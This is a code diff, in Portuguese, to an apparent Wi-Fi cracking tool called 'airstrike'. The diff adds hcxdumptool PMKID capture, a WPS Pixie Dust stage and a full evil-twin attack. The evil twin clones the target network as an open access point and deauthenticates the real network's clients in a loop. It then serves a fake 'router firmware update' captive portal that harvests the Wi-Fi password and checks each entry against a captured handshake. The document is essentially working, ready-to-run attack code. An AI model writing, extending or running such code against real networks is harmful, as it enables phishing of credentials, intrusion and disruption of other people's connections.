+        warn("hcxdumptool ausente: PMKID dedicado pulado (sudo apt install hcxdumptool)")
+        return (0, 0)
+    pcapng = out_prefix + "_hcx.pcapng"
+    hash_file = out_prefix + ".22000"
+    info("PMKID dedicado (hcxdumptool): canal %s, sem deauth; Ctrl+C pula" % channel)
+    try:
+        proc = subprocess.Popen(
+            ["hcxdumptool", "-i", mon_iface, "-w", pcapng, "-c", str(channel)],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            stdin=subprocess.DEVNULL,
+        )
+    except OSError as exc:
+        warn(f"hcxdumptool nao iniciou: {exc}")
+        return (0, 0)
+    got = (0, 0)
+    try:
+        prazo = time.time() + timeout
+        while time.time() < prazo:
+            if proc.poll() is not None:
+                warn("hcxdumptool terminou antes do prazo (interface ocupada? driver recusa?)")
+                break
+            if os.path.exists(pcapng) and os.path.getsize(pcapng) > 200:
+                extr = extract_22000(pcapng, hash_file, bssid)
+                if extr and (extr[0] or extr[1]):
+                    got = extr
+                    break
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print()
+        warn("PMKID dedicado interrompido pelo usuario")
+    finally:
+        try:
+            proc.kill()
+        except Exception:
+            pass
+    if got[0] or got[1]:
+        ok(f"hash obtido sem deauth: {got[0]} PMKID e {got[1]} EAPOL -> {hash_file}")
+    return got
+
+
+def testa_senha_no_cap(cap_file, bssid, senha):
+    """Confere uma senha candidata contra o handshake do .cap (aircrack)."""
+    if not os.path.isfile(cap_file):
+        return False
+    fd, lista = tempfile.mkstemp(prefix="airstrike_cand_", suffix=".txt")
+    try:
+        with os.fdopen(fd, "w", encoding="utf-8") as fh:
+            fh.write(senha + "\n")
+        rc, out = run(["aircrack-ng", "-a2", "-b", bssid, "-w", lista, cap_file],
+                      timeout=60)
+        return "key found" in out.lower()
+    except (OSError, subprocess.TimeoutExpired):
+        return False
+    finally:
+        try:
+            os.remove(lista)
+        except OSError:
+            pass
+
+
+PORTAL_NET_IP = "192.168.87.1"
+PORTAL_NET_IPS = ("192.168.87.10", "192.168.87.200")
+
+
+def portal_pagina(essid):
+    """Pagina do portal cativo (neutra, no estilo atualizacao de firmware)."""
+    nome = (essid or "Wi-Fi").replace("<", "&lt;").replace(">", "&gt;")
+    return """<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Atualizacao de rede</title><style>
+body{font-family:sans-serif;background:#f2f4f7;display:flex;min-height:100vh;
+margin:0;align-items:center;justify-content:center}
+.cx{background:#fff;max-width:340px;padding:28px;border-radius:10px;
+box-shadow:0 2px 12px rgba(0,0,0,.15);text-align:center}
+.cx h1{font-size:18px;margin:0 0 6px}.cx p{font-size:13px;color:#555}
+input{width:100%;padding:10px;margin:12px 0;border:1px solid #ccc;border-radius:6px;
+box-sizing:border-box;font-size:14px}
+button{width:100%;padding:10px;border:0;border-radius:6px;background:#0a63c9;
+color:#fff;font-size:14px;cursor:pointer}</style></head><body><div class="cx">
+<h1>Atualizacao do roteador</h1>
+<p><b>__ESSID__</b><br>Sua conexao sera restabelecida ao final da atualizacao.<br>
+Confirme a senha do Wi-Fi para continuar.</p>
+<form method="POST" action="/">
+<input type="password" name="senha" placeholder="Senha do Wi-Fi" required>
+<button type="submit">Continuar</button></form>
+<p style="font-size:11px;color:#999">Isso nao afeta suas configuracoes</p>
+</div></body></html>""".replace("__ESSID__", nome)
+
+
+def portal_servidor(porta, essid, candidatos_path):
+    """Sobe o servidor HTTP do portal; devolve o objeto HTTPServer."""
+    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+    pagina = portal_pagina(essid)
+    ok_page = """<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
+<meta http-equiv="refresh" content="5"><title>Atualizando</title></head>
+<body style="font-family:sans-serif;text-align:center;padding-top:15vh">
+<h3>Atualizando...</h3><p> nao desligue o aparelho. Voce sera reconectado em instantes.</p>
+</body></html>"""
+
+    class Handler(BaseHTTPRequestHandler):
+        def _manda(self, corpo, code=200):
+            data = corpo.encode("utf-8")
+            self.send_response(code)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(data)))
+            self.end_headers()
+            self.wfile.write(data)
+
+        def do_GET(self):
+            self._manda(pagina)
+
+        def do_POST(self):
+            try:
+                tamanho = int(self.headers.get("Content-Length") or 0)
+                corpo = self.rfile.read(tamanho).decode("utf-8", "replace")
+                campos = urllib.parse.parse_qs(corpo)
+                senha = (campos.get("senha") or campos.get("password") or [""])[0]
+                if senha:
+                    with open(candidatos_path, "a", encoding="utf-8") as fh:
+                        fh.write(senha + "\n")
+            except Exception:
+                pass
+            self._manda(ok_page)
+
+        def log_message(self, *a):  # silencia o log padrao
+            pass
+
+    servidor = ThreadingHTTPServer(("0.0.0.0", porta), Handler)
+    thread = threading.Thread(target=servidor.serve_forever, daemon=True)
+    thread.start()
+    return servidor
+
+
+def eviltwin_attack(args, bssid, essid, channel, cap_file, iface_ap):
+    """Evil twin com portal cativo (hostapd + dnsmasq + HTTP).
+
+    Clona o ESSID como rede aberta, deautentica os clientes do AP real e
+    valida cada senha digitada no portal contra o handshake ja capturado.
+    Devolve a senha ou None.
+    """
+    iface_ap = iface_base(iface_ap)  # aceita chegar em modo monitor (wlan1mon)
+    if not shutil.which("hostapd") or not shutil.which("dnsmasq"):
+        err("hostapd e dnsmasq sao obrigatorios no evil twin "
+            "(sudo apt install hostapd dnsmasq)")
+        return None
+    pasta = os.path.join(args.out, "eviltwin_%s" % time.strftime("%Y%m%d_%H%M%S"))
+    os.makedirs(pasta, exist_ok=True)
+    conf_ap = os.path.join(pasta, "hostapd.conf")
+    conf_dns = os.path.join(pasta, "dnsmasq.conf")
+    candidatos = os.path.join(pasta, "candidatos.txt")
+    log_ap = os.path.join(pasta, "hostapd.log")
+    log_dns = os.path.join(pasta, "dnsmasq.log")
+
+    essid_safe = (essid or "Wi-Fi")[:32]
+    hw_mode = "a" if int(channel) > 14 else "g"
+    with open(conf_ap, "w", encoding="utf-8") as fh:
+        fh.write(f"interface={iface_ap}\ndriver=nl80211\nssid={essid_safe}\n"
+                 f"channel={channel}\nhw_mode={hw_mode}\nauth_algs=1\n"
+                 f"ignore_broadcast_ssid=0\n")
+    with open(conf_dns, "w", encoding="utf-8") as fh:
+        fh.write(f"interface={iface_ap}\nbind-interfaces\n"
+                 f"dhcp-range={PORTAL_NET_IPS[0]},{PORTAL_NET_IPS[1]},12h\n"
+                 f"dhcp-option=3,{PORTAL_NET_IP}\ndhcp-option=6,{PORTAL_NET_IP}\n"
+                 f"address=/#/{PORTAL_NET_IP}\nno-resolv\n")
+
+    # 1) AP: tira o monitor da antena que hospeda o AP e sobe o hostapd
+    info(f"preparando AP clonado '{essid_safe}' na antena {iface_ap} "
+         f"(canal {channel})")
+    run(["airmon-ng", "stop", iface_ap if iface_ap.endswith("mon")
+         else iface_ap + "mon"], timeout=30)
+    run(["ip", "addr", "flush", "dev", iface_ap])
+    run(["ip", "addr", "add", PORTAL_NET_IP + "/24", "dev", iface_ap])
+    run(["ip", "link", "set", iface_ap, "up"])
+    proc_ap = subprocess.Popen(
+        ["hostapd", "-K", conf_ap],
+        stdout=open(log_ap, "w"), stderr=subprocess.STDOUT,
+        stdin=subprocess.DEVNULL)
+    proc_dns = subprocess.Popen(
+        ["dnsmasq", "-C", conf_dns, "-d"],
+        stdout=open(log_dns, "w"), stderr=subprocess.STDOUT,
+        stdin=subprocess.DEVNULL)
+    # espera o AP subir
+    ap_no_ar = False
+    for _ in range(15):
+        if proc_ap.poll() is not None:
+            break
+        rc, out = run(["iw", "dev", iface_ap, "info"], timeout=10)
+        if "type AP" in out:
+            ap_no_ar = True
+            break
+        time.sleep(1)
+    if not ap_no_ar:
+        err("hostapd nao subiu o AP clonado; veja " + log_ap)
+        for p in (proc_ap, proc_dns):
+            try:
+                p.kill()
+            except Exception:
+                pass
+        return None
+    ok(f"AP clonado no ar: {essid_safe} (portal em http://{PORTAL_NET_IP}:{args.portal_port})")
+
+    # 2) Deauth: monitor virtual na mesma antena; se o driver recusar,
+    #    avisa (o portal funciona mesmo assim para quem conectar)
+    deauth_iface = None
+    rc, phy_out = run(["iw", "dev", iface_ap, "info"], timeout=10)
+    mphy = re.search(r"phy\d+", phy_out)
+    if mphy:
+        rc, _ = run(["iw", "phy", mphy.group(0), "interface",
+                     "add", iface_ap + "mon", "type", "monitor"], timeout=10)
+        if rc == 0:
+            run(["ip", "link", "set", iface_ap + "mon", "up"])
+            deauth_iface = iface_ap + "mon"
+    if deauth_iface:
+        ok(f"deauth ativo pela mesma antena ({deauth_iface})")
+    else:
+        warn("driver recusou monitor virtual junto do AP: sem deauth automatico")
+        warn("os clientes so chegam ao portal se se conectarem sozinhos ao clone")
+
+    # 3) Portal + deauth em loop + conferencia das candidatas
+    servidor = portal_servidor(args.portal_port, essid_safe, candidatos)
+    info("portal cativo ativo; deautenticando clientes do AP real em loop")
+    info(f"aguardando senha digitada no portal (ate {args.portal_time}s; Ctrl+C encerra)")
+    testadas = set()
+    chave = None
+    prazo = time.time() + max(60, args.portal_time)
+    rodada = 0
+    try:
+        while time.time() < prazo:
+            # deauth periodica do AP real
+            if deauth_iface and rodada % 1 == 0:
+                run(["aireplay-ng", "-0", "5", "-a", bssid, deauth_iface],
+                    timeout=30)
+            rodada += 1
+            if os.path.isfile(candidatos):
+                try:
+                    with open(candidatos, "r", encoding="utf-8",
+                              errors="replace") as fh:
+                        linhas = [l.strip() for l in fh if l.strip()]
+                except OSError:
+                    linhas = []
+                for cand in linhas:
+                    if cand in testadas:
+                        continue
+                    testadas.add(cand)
+                    info(f"portal recebeu senha candidata ({len(cand)} chars); conferindo no handshake...")
+                    if testa_senha_no_cap(cap_file, bssid, cand):
+                        chave = cand
+                        break
+                if chave:
+                    break
+            time.sleep(max(5, args.deauth_interval))
+    except KeyboardInterrupt:
+        print()
+        warn("portal encerrado pelo usuario")
+    finally:
+        servidor.shutdown()
+        for p in (proc_ap, proc_dns):
+            try:
+                p.kill()
+            except Exception:
+                pass
+        if deauth_iface:
+            run(["iw", "dev", deauth_iface, "del"], timeout=10)
+        run(["ip", "addr", "flush", "dev", iface_ap])
+        info(f"arquivos do evil twin em {pasta}")
+    return chave
+
+
+# ---------------------------------------------------------------------------
 # Principal
 # ---------------------------------------------------------------------------
 
@@ -1136,6 +1930,9 @@ def build_parser():
         formatter_class=argparse.ArgumentDefaultsHelpFormatter,
     )
     p.add_argument("--iface", help="interface wireless (padrao: auto-detectada)")
+    p.add_argument("--iface-inject", dest="iface_inject",
+                   help="adaptador so para injecao/deauth (2a antena, estilo wifite; "
+                        "padrao: o mesmo da captura)")
     p.add_argument("--monitor", dest="monitor", help="interface ja em modo monitor (pula o setup)")
     p.add_argument("--scan-time", type=int, default=15, help="segundos de varredura")
     p.add_argument("--bssid", help="BSSID do alvo (pula o menu interativo)")
@@ -1157,13 +1954,32 @@ def build_parser():
                    help="adiciona a frente de incremento numerico (1 ate 8 digitos)")
     p.add_argument("--rules",
                    help="regras do hashcat, ex: /usr/share/hashcat/rules/best64.rule")
+    p.add_argument("--pmkid-time", type=int, default=45,
+                   help="segundos de PMKID dedicado (hcxdumptool, sem deauth) "
+                        "antes da captura dirigida (0 = desativa)")
+    p.add_argument("--no-wps", action="store_true",
+                   help="nao tenta WPS Pixie Dust (reaver/bully) no alvo")
+    p.add_argument("--pixie-time", type=int, default=90,
+                   help="tempo maximo do Pixie Dust em segundos (0 = desativa)")
+    p.add_argument("--eviltwin", action="store_true",
+                   help="apos capturar o handshake, sobe AP clonado com portal "
+                        "cativo (hostapd + dnsmasq) e valida as senhas digitadas")
+    p.add_argument("--portal-port", type=int, default=80,
+                   help="porta do portal cativo do evil twin")
+    p.add_argument("--portal-time", type=int, default=900,
+                   help="tempo maximo do portal cativo em segundos")
     p.add_argument("--hspeed", type=float, default=150000,
                    help="hashes/s usados na estimativa de tempo (padrao = GPU intermediaria)")
     p.add_argument("--bench", action="store_true",
                    help="mede a velocidade real do hashcat antes de estimar")
     p.add_argument("--out", default="captures", help="pasta para capturas e resultados")
+    p.add_argument("--crack", metavar="ARQUIVO",
+                   help="quebra sobre captura ja feita, sem capturar de novo: um .cap "
+                        "da sessao (ex: captures/captura_20261015_115942-01.cap), o "
+                        "prefixo da sessao, ou um .22000 direto")
     p.add_argument("--no-crack", action="store_true", help="para apos a captura, sem testar senhas")
-    p.add_argument("--keep", action="store_true", help="nao restaura a interface ao final")
+    p.add_argument("--keep", action="store_true",
+                   help="nao restaura nada: mantem o monitor ativo e a rede morta ao final")
     p.add_argument("--yes", "-y", action="store_true", help="pula o aviso de autorizacao")
     return p
 
@@ -1182,11 +1998,39 @@ def main(argv=None):
 
     os.makedirs(args.out, exist_ok=True)
 
+    # 0) Quebrar sobre uma captura ja feita? ------------------------------
+    # --crack <arquivo> escolhe direto; no terminal interativo, pergunta (s/n).
+    arquivo = args.crack
+    if arquivo is None and sys.stdin.isatty():
+        caps = list_caps(args.out)
+        if caps:
+            info(f"ja existem {len(caps)} captura(s) em {args.out}/")
+            try:
+                resp = input("Rodar a quebra sobre uma captura existente? "
+                             "(s = escolher captura / n = nova captura) [n]: ").strip().lower()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                resp = ""
+            if resp in ("s", "sim", "y", "yes"):
+                arquivo = escolher_captura(caps)
+                if arquivo is None:
+                    info("nenhuma captura escolhida; seguindo para nova captura")
+    if arquivo:
+        try:
+            return crack_captura_existente(arquivo, args)
+        except KeyboardInterrupt:
+            print()
+            warn("interrompido pelo usuario")
+            return 130
+
+    escolher_adaptadores(args)  # estilo wifite: pergunta qual adaptador usar
+
     adapter = Adapter(args.iface)
     cap = {"proc": None, "prefix": None}
     found_key = None
     target = None
     prefix = None
+    inject_iface = None
 
     try:
         # 1) Modo monitor --------------------------------------------------
@@ -1231,48 +2075,133 @@ def main(argv=None):
             warn("rede enterprise (802.1X): a wordlist nao se aplica")
 
         # 4) Captura dirigida ----------------------------------------------
-        log_path = os.path.join(args.out, "airodump.log")
-        cap["proc"], cap["prefix"] = start_capture(adapter.monitor, bssid, channel,
-                                                   args.out, log_path)
-        if cap["proc"] is None:
-            err("nao foi possivel iniciar a captura; verifique o adaptador e tente de novo")
-            return 1
-        prefix = cap["prefix"]
-        cap_file = prefix + "-01.cap"
+        # A rede so morre AQUI, na hora da captura: o NetworkManager e o
+        # wpa_supplicant atrapalham a captura (trocam de canal, reconectam).
+        info("matando processos de rede para a captura (airmon-ng check kill)")
+        run(["airmon-ng", "check", "kill"])
+        adapter.matou_processos = True
 
-        deauth_count = args.deauth
-        if deauth_count > 0:
-            info("etapa de teste de desconexao (aireplay-ng) habilitada")
-        else:
-            info("teste de desconexao desabilitado (--deauth 0)")
+        # Adaptador de injecao (estilo wifite: pode ser uma 2a antena) e
+        # teste de injecao — sem injecao o deauth nao funciona.
+        inject_iface = setup_injection(args, adapter, channel)
+        test_injection(inject_iface, bssid=bssid, essid=essid or None, channel=channel)
 
-        got = wait_handshake(adapter, cap, bssid, channel, args.out, log_path,
-                             capture_time=max(30, args.capture_time),
-                             deauth_count=deauth_count,
-                             deauth_interval=max(5, args.deauth_interval),
-                             iv_target=args.iv_target)
-        prefix = cap["prefix"]  # pode ter mudado se o adaptador caiu e religou
-        cap_file = prefix + "-01.cap"
-        if got not in ("handshake", "pmkid", "ivs"):
-            if "WEP" in enc:
-                warn("quantidade de IVs insuficiente; tentando mesmo assim")
+        # 4a) WPS Pixie Dust (reaver/bully): quebra instantanea se WPS aberto
+        got = None
+        hash_pronto = False
+        pmkid_file_pronto = None
+        if "WEP" not in enc and not args.no_wps and args.pixie_time > 0:
+            estado_wps = wps_probe(adapter.monitor, bssid, channel)
+            if estado_wps is None:
+                info("WPS ausente ou indeterminado no alvo (wash)")
+            elif estado_wps == "locked":
+                info("WPS presente mas TRAVADO no alvo; pixie dust nao se aplica")
             else:
-                warn("nem handshake nem PMKID confirmados durante a captura; tentando mesmo assim")
-                hs = has_handshake(cap_file, bssid)
-                if hs is False:
-                    warn("sem handshake no .cap: aumente --capture-time e mantenha clientes conectados")
-                    warn("ou capture com hcxdumptool para obter PMKID diretamente")
+                ok("WPS ABERTO no alvo: tentando Pixie Dust...")
+                pin, senha = wps_pixie(adapter.monitor, bssid, channel,
+                                       max(30, args.pixie_time))
+                if senha:
+                    ok(paint("CHAVE ENCONTRADA (Pixie Dust): %s" % senha,
+                             Color.BOLD + Color.GREEN))
+                    save_result(args.out, bssid, essid, senha)
+                    return 0
+                if pin:
+                    warn(f"Pixie Dust revelou o PIN WPS ({pin}), mas nao a senha;")
+                    warn(f"  continue com: reaver -i {adapter.monitor} -b {bssid} -p {pin}")
+                else:
+                    warn("Pixie Dust sem resultado (roteador corrigido ou sem vunerabilidade)")
+
+        # 4b) PMKID dedicado (hcxdumptool): hash sem deauth e sem cliente
+        if "WEP" not in enc and args.pmkid_time > 0:
+            prefix_pmkid = os.path.join(args.out,
+                                        "pmkid_" + bssid.replace(":", "").lower())
+            n_pmkid, n_eapol = pmkid_dedicado(adapter.monitor, bssid, channel,
+                                              max(15, args.pmkid_time), prefix_pmkid)
+            if n_pmkid or n_eapol:
+                hash_pronto = True
+                pmkid_file_pronto = prefix_pmkid + ".22000"
+                got = "pmkid"
+
+        if hash_pronto:
+            ok("hash obtido sem deauth: pulando a captura dirigida")
+            prefix = pmkid_file_pronto[:-6]
+            cap_file = None
+        else:
+            log_path = os.path.join(args.out, "airodump.log")
+            cap["proc"], cap["prefix"] = start_capture(adapter.monitor, bssid, channel,
+                                                       args.out, log_path)
+            if cap["proc"] is None:
+                err("nao foi possivel iniciar a captura; verifique o adaptador e tente de novo")
+                return 1
+            prefix = cap["prefix"]
+            cap_file = prefix + "-01.cap"
+
+            deauth_count = args.deauth
+            if deauth_count > 0:
+                info("etapa de teste de desconexao (aireplay-ng) habilitada")
+            else:
+                info("teste de desconexao desabilitado (--deauth 0)")
+
+            got = wait_handshake(adapter, cap, bssid, channel, args.out, log_path,
+                                 capture_time=max(30, args.capture_time),
+                                 deauth_count=deauth_count,
+                                 deauth_interval=max(5, args.deauth_interval),
+                                 iv_target=args.iv_target,
+                                 inject_iface=inject_iface)
+            prefix = cap["prefix"]  # pode ter mudado se o adaptador caiu e religou
+            cap_file = prefix + "-01.cap"
+            if got not in ("handshake", "pmkid", "ivs"):
+                if "WEP" in enc:
+                    warn("quantidade de IVs insuficiente; tentando mesmo assim")
+                else:
+                    warn("nem handshake nem PMKID confirmados durante a captura; tentando mesmo assim")
+                    hs = has_handshake(cap_file, bssid)
+                    if hs is False:
+                        warn("sem handshake no .cap: aumente --capture-time e mantenha clientes conectados")
+                        warn("se os aparelhos ficam na banda 5G, capture o BSSID de 5G:")
+                        warn("  o deauth enviado no 2.4G nao alcana clientes da rede 5G")
+                        warn("ou deixe o PMKID dedicado (hcxdumptool) trabalhar: --pmkid-time maior")
 
         # 5) Parar captura -------------------------------------------------
         _stop_process(cap["proc"])
         cap["proc"] = None
         time.sleep(1)
 
+        # 5b) Evil twin (portal cativo), se pedido --------------------------
+        # Antes de restaurar: o NetworkManager morto e o que deixa o clone
+        # e o deauth funcionarem. O finally do main devolve tudo no fim.
+        if args.eviltwin and "WEP" not in enc:
+            if not cap_file or has_handshake(cap_file, bssid) is False:
+                err("evil twin precisa de um handshake valido do alvo na captura; "
+                    "rode de novo com --capture-time maior")
+                return 1
+            info("modo evil twin: AP clonado + portal cativo (senhas digitadas "
+                 "sao conferidas contra o handshake capturado)")
+            chave = eviltwin_attack(args, bssid, essid, channel, cap_file,
+                                    inject_iface or adapter.monitor)
+            if chave:
+                ok(paint("CHAVE ENCONTRADA (evil twin): %s" % chave,
+                         Color.BOLD + Color.GREEN))
+                save_result(args.out, bssid, essid, chave)
+                return 0
+            warn("portal encerrado sem confirmar a senha; o handshake segue salvo")
+            return 2
+
+        # 6) Restaurar a interface e a internet -----------------------------
+        # A quebra e offline: a rede volta ANTES dela, e nao so no fim.
+        if not args.keep:
+            info("captura encerrada; restaurando a interface e a internet...")
+            monitores = [m for m in (adapter.monitor, inject_iface) if m]
+            restore_setup(monitores, adapter.matou_processos)
+            adapter.monitor = None
+            adapter.matou_processos = False
+            inject_iface = None
+
         if args.no_crack:
             info(f"captura salva em {cap_file} (quebra pulada por --no-crack)")
             return 0
 
-        # 6) Lista de senhas ------------------------------------------------
+        # 7) Lista de senhas ------------------------------------------------
         wordlist = prepare_wordlist(args.wordlist)
         if wordlist is None:
             if not sys.stdin.isatty():
@@ -1287,7 +2216,7 @@ def main(argv=None):
             warn("sem lista de senhas; a captura ficou salva em %s" % cap_file)
             return 1
 
-        # 7) Quebra ---------------------------------------------------------
+        # 8) Quebra ---------------------------------------------------------
         if "WEP" in enc:
             info("rede WEP: aircrack-ng tenta recuperar a chave sem wordlist")
             log_file = os.path.splitext(cap_file)[0] + "_chave.txt"
@@ -1299,20 +2228,29 @@ def main(argv=None):
                 with open(log_file, "r", encoding="utf-8", errors="replace") as fh:
                     found_key = fh.read().strip() or None
         else:
-            # Extrai PMKID/EAPOL no formato 22000 (hcxtools) para o hashcat
-            hash_file = prefix + ".22000"
-            extr = extract_22000(cap_file, hash_file, bssid)
             pmkid_n = eapol_n = 0
-            if extr is None:
-                warn("hcxpcapngtool ausente: ataque PMKID desativado (sudo apt install hcxtools)")
+            if hash_pronto and pmkid_file_pronto and os.path.isfile(pmkid_file_pronto):
+                hash_file = pmkid_file_pronto
+                pmkid_n, eapol_n = count_hashes_in_22000(hash_file, bssid)
+                ok(f"hashes do PMKID dedicado: {pmkid_n} PMKID e {eapol_n} EAPOL -> {hash_file}")
             else:
-                pmkid_n, eapol_n = extr
-                if pmkid_n or eapol_n:
-                    ok(f"hashes extraidos: {pmkid_n} PMKID e {eapol_n} EAPOL -> {hash_file}")
+                # Extrai PMKID/EAPOL no formato 22000 (hcxtools) para o hashcat
+                hash_file = prefix + ".22000"
+                extr = extract_22000(cap_file, hash_file, bssid)
+                if extr is None:
+                    warn("hcxpcapngtool ausente: ataque PMKID desativado (sudo apt install hcxtools)")
+                else:
+                    pmkid_n, eapol_n = extr
+                    if pmkid_n or eapol_n:
+                        ok(f"hashes extraidos: {pmkid_n} PMKID e {eapol_n} EAPOL -> {hash_file}")
 
             cracker = args.cracker
             if cracker == "auto":
                 cracker = "hashcat" if (shutil.which("hashcat") and (pmkid_n or eapol_n)) else "aircrack"
+            if cracker == "aircrack" and hash_pronto and not cap_file:
+                err("o PMKID dedicado nao gera .cap: o aircrack-ng precisa do hashcat "
+                    "(sudo apt install hashcat) ou da captura dirigida")
+                return 1
             if cracker == "hashcat":
                 if not shutil.which("hashcat"):
                     warn("hashcat ausente; usando aircrack-ng no .cap (sudo apt install hashcat)")
@@ -1333,8 +2271,10 @@ def main(argv=None):
         warn("chave nao encontrada com esta lista. Isso NAO significa que a rede e 'invulneravel':")
         warn("  - a senha pode nao estar na lista")
         warn("  - a captura pode nao ter os dados necessarios (tente --capture-time maior)")
-        info(f"captura mantida em {cap_file} para novas tentativas:")
-        info(f"  sudo aircrack-ng -w {args.wordlist} -b {bssid} {cap_file}")
+        if cap_file:
+            info(f"captura mantida em {cap_file} para novas tentativas:")
+            info(f"  sudo airstrike --crack {cap_file}          # quebra sem recapturar")
+            info(f"  sudo aircrack-ng -w {args.wordlist} -b {bssid} {cap_file}")
         if "WEP" not in enc and os.path.isfile(prefix + ".22000"):
             info(f"  hashcat -m 22000 {prefix}.22000 {args.wordlist}")
         return 2
@@ -1346,7 +2286,9 @@ def main(argv=None):
     finally:
         _stop_process(cap["proc"])
         if not args.keep:
-            restore_setup(adapter.monitor, adapter.matou_processos)
+            monitores = [m for m in (adapter.monitor, inject_iface) if m]
+            if monitores or adapter.matou_processos:
+                restore_setup(monitores, adapter.matou_processos)
         else:
             info("--keep: interface mantida como esta")
 
